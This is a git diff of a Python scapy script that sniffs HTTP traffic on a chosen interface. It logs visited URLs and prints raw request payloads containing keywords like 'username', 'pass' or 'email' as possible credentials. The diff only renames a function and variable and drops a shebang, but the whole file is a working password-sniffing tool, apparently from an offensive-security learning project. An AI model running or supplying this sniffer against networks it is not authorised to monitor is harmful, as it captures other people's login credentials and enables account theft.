@@ -1,5 +1,3 @@
-#! /home/paulomesquita/.pyenv/shims/python
-
 from struct import pack
 import scapy.all as scapy
 from scapy.layers import http
@@ -16,17 +14,17 @@ def get_arguments():
 
 
 def sniff(interface):
-    scapy.sniff(iface=interface, store=False, prn=process_package)
+    scapy.sniff(iface=interface, store=False, prn=process_packet)
     
-def process_package(package):
-    if package.haslayer(http.HTTPRequest):
-        print("[+] Url visited: {}{}".format(package[http.HTTPRequest].Host.decode(),package[http.HTTPRequest].Path.decode()))
-        if package.haslayer(scapy.Raw):
-            load = package[scapy.Raw].load
+def process_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        print("[+] Url visited: {}{}".format(packet[http.HTTPRequest].Host.decode(),packet[http.HTTPRequest].Path.decode()))
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
             keywords = ["username", "uname", "name", "pass", "password", "login", "email", "e-mail", "e_mail"]
             for keyword in keywords:
                 if keyword.encode() in load:
-                    print("[*] Possible username and password: {}".format(package[scapy.Raw].load.decode()))
+                    print("[*] Possible username and password: {}".format(packet[scapy.Raw].load.decode()))
                     break
 
 options = get_arguments()
